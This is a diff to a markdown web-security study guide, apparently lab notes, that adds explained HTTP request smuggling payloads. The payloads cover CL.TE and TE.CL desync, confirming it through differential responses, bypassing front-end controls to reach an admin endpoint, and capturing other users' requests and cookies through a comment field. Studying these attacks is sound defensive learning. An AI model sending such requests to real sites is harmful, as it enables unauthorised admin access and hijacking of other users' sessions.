@@ -983,28 +983,157 @@ Different types of HTTP request smuggling exist, they are :
 
 #### Basics
 
-- HTTP request smuggling, basic CL.TE vulnerability
-- HTTP request smuggling, basic TE.CL vulnerability
+- Basic CL.TE vulnerability
 
+	You have to send a chunk request passing low content length to perform double requests in one, Here is an example:
+	
+	```header
+	POST / HTTP/1.1  
+	Host: WEBSITE  
+	Connection: keep-alive  
+	Content-Type: application/x-www-form-urlencoded  
+	Content-Length: 6  
+	Transfer-Encoding: chunked  
 
+	0  
+
+	G
+	```
+	
+	
+- Basic TE.CL vulnerability
+
+	Same as previous with a well formed double request, here is an example:
+	
+	```header
+	POST / HTTP/1.1  
+	Host: WEBSITE  
+	Content-Type: application/x-www-form-urlencoded  
+	Content-length: 4  
+	Transfer-Encoding: chunked  
+
+	5c  
+	GPOST / HTTP/1.1  
+	Content-Type: application/x-www-form-urlencoded  
+	Content-Length: 15  
+
+	x=1  
+	0
+
+	```
+	
+	
 #### Confirming vulnerabilities
 
-- HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
-- HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
+- Confirming a CL.TE vulnerability via differential responses
 
+	Using same technique as previous you can target a page you are sure about the response like 404, home or whatever. The request should return the page on the second header. Here is an example
+	
+	```header
+	POST / HTTP/1.1  
+	Host: WEBSITE 
+	Content-Type: application/x-www-form-urlencoded  
+	Content-Length: 35  
+	Transfer-Encoding: chunked  
 
+	0  
+
+	GET /404 HTTP/1.1  
+	X-Ignore: X
+
+	```
+	
+- Confirming a TE.CL vulnerability via differential responses
+
+	Same thing as before just a different way to do it.  Here is an example:
+	
+	```header
+	POST / HTTP/1.1  
+	Host: WEBSITE
+	Content-Type: application/x-www-form-urlencoded  
+	Content-length: 4  
+	Transfer-Encoding: chunked  
+
+	5e  
+	POST /404 HTTP/1.1  
+	Content-Type: application/x-www-form-urlencoded  
+	Content-Length: 15  
+
+	x=1  
+	0
+
+	```
+	
+	
 #### Bypass front-end protections
-- Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
-- Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+- Bypass front-end security controls, CL.TE vulnerability
 
+	Here is an example of how you can bypass the front to make the back do what you want (that's an example and you really have to adapt it):
+	
+	```header
+	POST / HTTP/1.1  
+    Host: WEBSITE
+    Content-Type: application/x-www-form-urlencoded  
+    Content-Length: 139  
+    Transfer-Encoding: chunked  
+      
+    0  
+      
+    GET /admin/add?username=test&password=test HTTP/1.1  
+    Host: localhost  
+    Content-Type: application/x-www-form-urlencoded  
+    Content-Length: 10  
+      
+    x=
+	
+	```
+	
+	
+- Bypass front-end security controls, TE.CL vulnerability
+
+	Same thing as before, just the necessary change:
+	
+	```header
+	POST / HTTP/1.1  
+	Host: WEBSITE  
+	Content-length: 4  
+	Transfer-Encoding: chunked  
+
+	87  
+	GET /admin/add?username=test&password=test HTTP/1.1  
+	Host: localhost  
+	Content-Type: application/x-www-form-urlencoded  
+	Content-Length: 15  
+
+	x=1  
+	0
+
+	```
 
 #### Advanced
 
-- Exploiting HTTP request smuggling to reveal front-end request rewriting
 - Exploiting HTTP request smuggling to capture other users' requests
-- Exploiting HTTP request smuggling to deliver reflected XSS
-- Exploiting HTTP request smuggling to perform web cache poisoning
-- Exploiting HTTP request smuggling to perform web cache deception
+
+	You need to be able to have a field that is at the end of your post data and to be able to update a site field or comment or post or ... In that way you will catch the other user requests by redirect it back to your data in your post request. Here is an example: 
+	
+	```
+	GET / HTTP/1.1  
+	Host: WEBSITE 
+	Transfer-Encoding: chunked  
+	Content-Length: 324  
+
+	0  
+
+	POST /post/comment HTTP/1.1  
+	Host: WEBSITE  
+	Content-Type: application/x-www-form-urlencoded  
+	Content-Length: 400  
+	Cookie: session=YOURCOOKIE
+
+	csrf=CSRFTOKEN&postId=2&name=YOURNAME&email=EMAIL&comment=
+	
+	
+	```
 
 
 #### How to prevent them
@@ -1291,7 +1420,7 @@ Information disclosure, also known as information leakage, is when a website uni
 
 ## HTTP Host header attacks
 
-can lead to :
+Can lead to :
 
 -   Web cache poisoning
 -   Business [logic flaws](https://portswigger.net/web-security/logic-flaws) in specific functionality
